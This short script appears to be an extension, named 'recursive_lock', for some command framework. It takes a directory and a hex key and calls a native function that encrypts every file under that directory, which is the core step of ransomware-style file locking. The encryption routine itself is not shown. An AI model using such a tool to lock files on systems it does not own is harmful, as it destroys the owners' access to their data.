print_log("Starting Recursive Encryption...");

if args.len() < 2 {
    return "Usage: extension load recursive_lock <directory> <hex_key>";
}

let target_dir = args[0];
let key = args[1];

print_log("Target: " + target_dir);
print_log("Key: " + key);

// Call Native Recursive Function
// 
let result = internal_encrypt_recursive(target_dir, key);

return result;
